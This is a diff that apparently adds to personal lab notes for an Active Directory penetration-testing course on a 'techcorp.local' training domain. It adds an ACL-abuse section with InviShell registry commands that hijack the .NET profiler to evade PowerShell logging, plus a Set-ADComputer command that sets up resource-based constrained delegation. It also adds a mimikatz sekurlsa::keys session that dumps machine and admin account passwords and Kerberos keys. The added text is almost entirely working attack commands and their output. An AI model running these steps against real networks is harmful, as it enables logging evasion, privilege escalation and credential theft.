@@ -357,4 +357,295 @@ Current LogonId is 0:0x195b276
 
 Cached Tickets: (0)
 ```
+Abusse of ACLS:
+
+```
+C:\Windows\system32>C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
+
+C:\Windows\system32>set COR_ENABLE_PROFILING=1
+
+C:\Windows\system32>set COR_PROFILER={cf0d821e-299b-5307-a3d8-b283c03916db}
+
+C:\Windows\system32>REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}" /f
+The operation completed successfully.
+
+C:\Windows\system32>REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}\InprocServer32" /f
+The operation completed successfully.
+
+C:\Windows\system32>REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}\InprocServer32" /ve /t REG_SZ /d "C:\AD\Tools\InviShell\InShellProf.dll" /f
+The operation completed successfully.
+
+C:\Windows\system32>powershell
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\Windows\system32> Import-Module C:\AD\Tools\ADModule-master\Microsoft.ActiveDirectory.Management.dll
+PS C:\Windows\system32> Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1
+
+```
+
+```
+PS C:\Windows\system32> $comps = 'student1$','student11$','student12$','student13$','student14$','student15$', 'student16$','student17$','student18$','student19$','student20$','student21$','student22$','student1$','student24$','student25$','student26$','student27$','student28$','student29$','student30$'
+PS C:\Windows\system32> Set-ADComputer -Identity us-helpdesk -PrincipalsAllowedToDelegateToAccount $comps -Verbose
+VERBOSE: Performing the operation "Set" on target "CN=US-HELPDESK,CN=Computers,DC=us,DC=techcorp,DC=local".
+```
+
 ## Extract Secrets
+Extract machine studentuser17 hash of system user [SID S-1-5-18]:
+```
+
+Microsoft Windows [Version 10.0.17763.3650]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>C:\AD\Tools\mimikatz.exe
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz # privilege::debug
+Privilege '20' OK
+
+mimikatz # sekurlsa::keys
+
+Authentication Id : 0 ; 25459565 (00000000:01847b6d)
+Session           : Interactive from 3
+User Name         : DWM-3
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 2/20/2023 11:09:50 AM
+SID               : S-1-5-90-0-3
+
+         * Username : STUDENT17$
+         * Domain   : us.techcorp.local
+         * Password : Z^NIHcYS uzq$ty4NG=]XuN x`2O<L",_k#Rj9"6G3a-xM=J2&qEq[KbWj@bO7iQr>C#hhZqKZnV2uysSw7pFkc!Ik\_h7&q: n(x\oq<]'*`ruC/FHQ!usO
+         * Key List :
+           aes256_hmac       a6836406f0142332aa1539dfba1ac047548a5a2bf388aa83e08182b31ef870b4
+           aes128_hmac       74717db61f2d4455c5b5b1611d36f4b5
+           rc4_hmac_nt       bca76bfd071cc0a82033132dbededfcd
+           rc4_hmac_old      bca76bfd071cc0a82033132dbededfcd
+           rc4_md4           bca76bfd071cc0a82033132dbededfcd
+           rc4_hmac_nt_exp   bca76bfd071cc0a82033132dbededfcd
+           rc4_hmac_old_exp  bca76bfd071cc0a82033132dbededfcd
+
+Authentication Id : 0 ; 25458079 (00000000:0184759f)
+Session           : Interactive from 3
+User Name         : UMFD-3
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 2/20/2023 11:09:50 AM
+SID               : S-1-5-96-0-3
+
+         * Username : STUDENT17$
+         * Domain   : us.techcorp.local
+         * Password : Z^NIHcYS uzq$ty4NG=]XuN x`2O<L",_k#Rj9"6G3a-xM=J2&qEq[KbWj@bO7iQr>C#hhZqKZnV2uysSw7pFkc!Ik\_h7&q: n(x\oq<]'*`ruC/FHQ!usO
+         * Key List :
+           aes256_hmac       a6836406f0142332aa1539dfba1ac047548a5a2bf388aa83e08182b31ef870b4
+           aes128_hmac       74717db61f2d4455c5b5b1611d36f4b5
+           rc4_hmac_nt       bca76bfd071cc0a82033132dbededfcd
+           rc4_hmac_old      bca76bfd071cc0a82033132dbededfcd
+           rc4_md4           bca76bfd071cc0a82033132dbededfcd
+           rc4_hmac_nt_exp   bca76bfd071cc0a82033132dbededfcd
+           rc4_hmac_old_exp  bca76bfd071cc0a82033132dbededfcd
+
+Authentication Id : 0 ; 49456 (00000000:0000c130)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 2/18/2023 3:44:12 PM
+SID               : S-1-5-90-0-1
+
+         * Username : STUDENT17$
+         * Domain   : us.techcorp.local
+         * Password : Z^NIHcYS uzq$ty4NG=]XuN x`2O<L",_k#Rj9"6G3a-xM=J2&qEq[KbWj@bO7iQr>C#hhZqKZnV2uysSw7pFkc!Ik\_h7&q: n(x\oq<]'*`ruC/FHQ!usO
+         * Key List :
+           aes256_hmac       a6836406f0142332aa1539dfba1ac047548a5a2bf388aa83e08182b31ef870b4
+           aes128_hmac       74717db61f2d4455c5b5b1611d36f4b5
+           rc4_hmac_nt       bca76bfd071cc0a82033132dbededfcd
+           rc4_hmac_old      bca76bfd071cc0a82033132dbededfcd
+           rc4_md4           bca76bfd071cc0a82033132dbededfcd
+           rc4_hmac_nt_exp   bca76bfd071cc0a82033132dbededfcd
+           rc4_hmac_old_exp  bca76bfd071cc0a82033132dbededfcd
+
+Authentication Id : 0 ; 29897 (00000000:000074c9)
+Session           : Interactive from 1
+User Name         : UMFD-1
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 2/18/2023 3:44:12 PM
+SID               : S-1-5-96-0-1
+
+         * Username : STUDENT17$
+         * Domain   : us.techcorp.local
+         * Password : Z^NIHcYS uzq$ty4NG=]XuN x`2O<L",_k#Rj9"6G3a-xM=J2&qEq[KbWj@bO7iQr>C#hhZqKZnV2uysSw7pFkc!Ik\_h7&q: n(x\oq<]'*`ruC/FHQ!usO
+         * Key List :
+           aes256_hmac       a6836406f0142332aa1539dfba1ac047548a5a2bf388aa83e08182b31ef870b4
+           aes128_hmac       74717db61f2d4455c5b5b1611d36f4b5
+           rc4_hmac_nt       bca76bfd071cc0a82033132dbededfcd
+           rc4_hmac_old      bca76bfd071cc0a82033132dbededfcd
+           rc4_md4           bca76bfd071cc0a82033132dbededfcd
+           rc4_hmac_nt_exp   bca76bfd071cc0a82033132dbededfcd
+           rc4_hmac_old_exp  bca76bfd071cc0a82033132dbededfcd
+
+Authentication Id : 0 ; 26587766 (00000000:0195b276)
+Session           : NewCredentials from 0
+User Name         : studentuser17
+Domain            : US
+Logon Server      : (null)
+Logon Time        : 2/20/2023 11:43:55 AM
+SID               : S-1-5-21-210670787-2521448726-163245708-16107
+
+         * Username : mgmtadmin
+         * Domain   : US.TECHCORP.LOCAL
+         * Password : (null)
+         * Key List :
+           aes256_hmac       32827622ac4357bcb476ed3ae362f9d3e7d27e292eb27519d2b8b419db24c00f
+           null              <no size, buffer is incorrect>
+           null              <no size, buffer is incorrect>
+           null              <no size, buffer is incorrect>
+           null              <no size, buffer is incorrect>
+           null              <no size, buffer is incorrect>
+           null              <no size, buffer is incorrect>
+
+Authentication Id : 0 ; 49433 (00000000:0000c119)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 2/18/2023 3:44:12 PM
+SID               : S-1-5-90-0-1
+
+         * Username : STUDENT17$
+         * Domain   : us.techcorp.local
+         * Password : Z^NIHcYS uzq$ty4NG=]XuN x`2O<L",_k#Rj9"6G3a-xM=J2&qEq[KbWj@bO7iQr>C#hhZqKZnV2uysSw7pFkc!Ik\_h7&q: n(x\oq<]'*`ruC/FHQ!usO
+         * Key List :
+           aes256_hmac       a6836406f0142332aa1539dfba1ac047548a5a2bf388aa83e08182b31ef870b4
+           aes128_hmac       74717db61f2d4455c5b5b1611d36f4b5
+           rc4_hmac_nt       bca76bfd071cc0a82033132dbededfcd
+           rc4_hmac_old      bca76bfd071cc0a82033132dbededfcd
+           rc4_md4           bca76bfd071cc0a82033132dbededfcd
+           rc4_hmac_nt_exp   bca76bfd071cc0a82033132dbededfcd
+           rc4_hmac_old_exp  bca76bfd071cc0a82033132dbededfcd
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : STUDENT17$
+Domain            : US
+Logon Server      : (null)
+Logon Time        : 2/18/2023 3:44:11 PM
+SID               : S-1-5-18
+
+         * Username : student17$
+         * Domain   : US.TECHCORP.LOCAL
+         * Password : (null)
+         * Key List :
+           aes256_hmac       47054c261e84434a9491465fba6cbea2efea6b8acf99e52054746d44f5d1f35d
+           rc4_hmac_nt       bca76bfd071cc0a82033132dbededfcd
+           rc4_hmac_old      bca76bfd071cc0a82033132dbededfcd
+           rc4_md4           bca76bfd071cc0a82033132dbededfcd
+           rc4_hmac_nt_exp   bca76bfd071cc0a82033132dbededfcd
+           rc4_hmac_old_exp  bca76bfd071cc0a82033132dbededfcd
+
+Authentication Id : 0 ; 25477393 (00000000:0184c111)
+Session           : RemoteInteractive from 3
+User Name         : studentuser17
+Domain            : US
+Logon Server      : US-DC
+Logon Time        : 2/20/2023 11:09:52 AM
+SID               : S-1-5-21-210670787-2521448726-163245708-16107
+
+         * Username : studentuser17
+         * Domain   : US.TECHCORP.LOCAL
+         * Password : (null)
+         * Key List :
+           aes256_hmac       77884f1700e493d5bb4335d0cbaabe506dee8fed1fb1d2f06344047d04099199
+           rc4_hmac_nt       8f4ae466eb08f7e8c8f4dd9ec2a2caa1
+           rc4_hmac_old      8f4ae466eb08f7e8c8f4dd9ec2a2caa1
+           rc4_md4           8f4ae466eb08f7e8c8f4dd9ec2a2caa1
+           rc4_hmac_nt_exp   8f4ae466eb08f7e8c8f4dd9ec2a2caa1
+           rc4_hmac_old_exp  8f4ae466eb08f7e8c8f4dd9ec2a2caa1
+
+Authentication Id : 0 ; 25459515 (00000000:01847b3b)
+Session           : Interactive from 3
+User Name         : DWM-3
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 2/20/2023 11:09:50 AM
+SID               : S-1-5-90-0-3
+
+         * Username : STUDENT17$
+         * Domain   : us.techcorp.local
+         * Password : Z^NIHcYS uzq$ty4NG=]XuN x`2O<L",_k#Rj9"6G3a-xM=J2&qEq[KbWj@bO7iQr>C#hhZqKZnV2uysSw7pFkc!Ik\_h7&q: n(x\oq<]'*`ruC/FHQ!usO
+         * Key List :
+           aes256_hmac       a6836406f0142332aa1539dfba1ac047548a5a2bf388aa83e08182b31ef870b4
+           aes128_hmac       74717db61f2d4455c5b5b1611d36f4b5
+           rc4_hmac_nt       bca76bfd071cc0a82033132dbededfcd
+           rc4_hmac_old      bca76bfd071cc0a82033132dbededfcd
+           rc4_md4           bca76bfd071cc0a82033132dbededfcd
+           rc4_hmac_nt_exp   bca76bfd071cc0a82033132dbededfcd
+           rc4_hmac_old_exp  bca76bfd071cc0a82033132dbededfcd
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : STUDENT17$
+Domain            : US
+Logon Server      : (null)
+Logon Time        : 2/18/2023 3:44:12 PM
+SID               : S-1-5-20
+
+         * Username : student17$
+         * Domain   : US.TECHCORP.LOCAL
+         * Password : (null)
+         * Key List :
+           aes256_hmac       47054c261e84434a9491465fba6cbea2efea6b8acf99e52054746d44f5d1f35d
+           rc4_hmac_nt       bca76bfd071cc0a82033132dbededfcd
+           rc4_hmac_old      bca76bfd071cc0a82033132dbededfcd
+           rc4_md4           bca76bfd071cc0a82033132dbededfcd
+           rc4_hmac_nt_exp   bca76bfd071cc0a82033132dbededfcd
+           rc4_hmac_old_exp  bca76bfd071cc0a82033132dbededfcd
+
+Authentication Id : 0 ; 29803 (00000000:0000746b)
+Session           : Interactive from 0
+User Name         : UMFD-0
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 2/18/2023 3:44:12 PM
+SID               : S-1-5-96-0-0
+
+         * Username : STUDENT17$
+         * Domain   : us.techcorp.local
+         * Password : Z^NIHcYS uzq$ty4NG=]XuN x`2O<L",_k#Rj9"6G3a-xM=J2&qEq[KbWj@bO7iQr>C#hhZqKZnV2uysSw7pFkc!Ik\_h7&q: n(x\oq<]'*`ruC/FHQ!usO
+         * Key List :
+           aes256_hmac       a6836406f0142332aa1539dfba1ac047548a5a2bf388aa83e08182b31ef870b4
+           aes128_hmac       74717db61f2d4455c5b5b1611d36f4b5
+           rc4_hmac_nt       bca76bfd071cc0a82033132dbededfcd
+           rc4_hmac_old      bca76bfd071cc0a82033132dbededfcd
+           rc4_md4           bca76bfd071cc0a82033132dbededfcd
+           rc4_hmac_nt_exp   bca76bfd071cc0a82033132dbededfcd
+           rc4_hmac_old_exp  bca76bfd071cc0a82033132dbededfcd
+
+Authentication Id : 0 ; 25477084 (00000000:0184bfdc)
+Session           : RemoteInteractive from 3
+User Name         : studentuser17
+Domain            : US
+Logon Server      : US-DC
+Logon Time        : 2/20/2023 11:09:52 AM
+SID               : S-1-5-21-210670787-2521448726-163245708-16107
+
+         * Username : studentuser17
+         * Domain   : US.TECHCORP.LOCAL
+         * Password : (null)
+         * Key List :
+           aes256_hmac       77884f1700e493d5bb4335d0cbaabe506dee8fed1fb1d2f06344047d04099199
+           rc4_hmac_nt       8f4ae466eb08f7e8c8f4dd9ec2a2caa1
+           rc4_hmac_old      8f4ae466eb08f7e8c8f4dd9ec2a2caa1
+           rc4_md4           8f4ae466eb08f7e8c8f4dd9ec2a2caa1
+           rc4_hmac_nt_exp   8f4ae466eb08f7e8c8f4dd9ec2a2caa1
+           rc4_hmac_old_exp  8f4ae466eb08f7e8c8f4dd9ec2a2caa1
+
+mimikatz #
+```
